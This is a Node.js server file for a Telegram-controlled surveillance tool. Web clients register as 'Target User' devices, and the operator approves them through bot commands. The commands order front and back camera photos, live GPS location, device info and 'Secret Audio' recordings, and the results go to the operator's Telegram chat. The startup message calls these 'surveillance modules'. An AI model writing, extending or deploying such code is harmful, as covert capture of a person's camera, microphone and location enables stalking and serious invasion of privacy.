const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const token = process.env.BOT_TOKEN;
const adminId = process.env.ADMIN_ID;

if (!token || !adminId) {
    console.error("Error: BOT_TOKEN or ADMIN_ID is missing in environment variables!");
    process.exit(1);
}

const bot = new TelegramBot(token, { polling: true });

// Global Session Variables for Security & Approval
global.bot = bot;
global.adminId = adminId;
global.io = io;
global.pendingSocketId = null;
global.approvedSocketId = null;
global.pendingUsername = "Unknown";

// Register All Telegram Menu Commands
bot.setMyCommands([
    { command: 'start', description: 'Start bot & check status' },
    { command: 'approve', description: 'Authorize pending device' },
    { command: 'moref', description: 'Front Camera 5 Photos' },
    { command: 'moreb', description: 'Back Camera 5 Photos' },
    { command: 'location', description: 'Get Live GPS Location' },
    { command: 'info', description: 'Get Device & Battery Info' },
    { command: 'audio', description: 'Record 5s Secret Audio' }
]).then(() => {
    console.log('All Telegram bot commands registered successfully!');
    bot.sendMessage(adminId, "🟢 **Server is Online (Modular Mode)!**\nAll surveillance modules are active.").catch(err => {});
}).catch(err => {
    console.error('Failed to set Telegram commands:', err);
});

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Load Feature Modules
require('./modules/camera');
require('./modules/location');
require('./modules/info');
require('./modules/audio');

// Socket.io Connection & Approval Handlers
io.on('connection', (socket) => {
    console.log('Client connected:', socket.id);

    socket.on('register_device', (data) => {
        global.pendingSocketId = socket.id;
        global.pendingUsername = data.name || "Target User";

        bot.sendMessage(adminId, `🔔 **New Device Connection Request!**\n\n👤 Name: \`${global.pendingUsername}\`\n📱 Socket ID: \`${socket.id}\`\n\nType **/approve** to authorize.`);
    });

    socket.on('disconnect', () => {
        console.log('Client disconnected:', socket.id);
        if (socket.id === global.approvedSocketId) {
            global.approvedSocketId = null;
            bot.sendMessage(adminId, `⚠️ **Device Disconnected!** Session closed.`);
        }
        if (socket.id === global.pendingSocketId) {
            global.pendingSocketId = null;
        }
    });
});

// Telegram Command: /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() === adminId.toString()) {
        bot.sendMessage(chatId, `👋 **Welcome back, Raj bhai!**\n\nSystem Status:\n- Approved Device: ${global.approvedSocketId ? '🟢 Connected' : '🔴 None'}\n\nCommands:\n/approve - Authorize device\n/moref - Front Camera\n/moreb - Back Camera\n/location - GPS Location\n/info - Device Specs\n/audio - Record Mic Audio`);
    }
});

// Telegram Command: /approve
bot.onText(/\/approve/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() === adminId.toString()) {
        if (global.pendingSocketId) {
            global.approvedSocketId = global.pendingSocketId;
            io.to(global.approvedSocketId).emit('device_approved');
            bot.sendMessage(chatId, `✅ **Device Approved Successfully!**\nUser (${global.pendingUsername}) is now authorized.`);
            global.pendingSocketId = null;
        } else {
            bot.sendMessage(chatId, "❌ No pending device request waiting for approval.");
        }
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running successfully on port ${PORT}`);
});
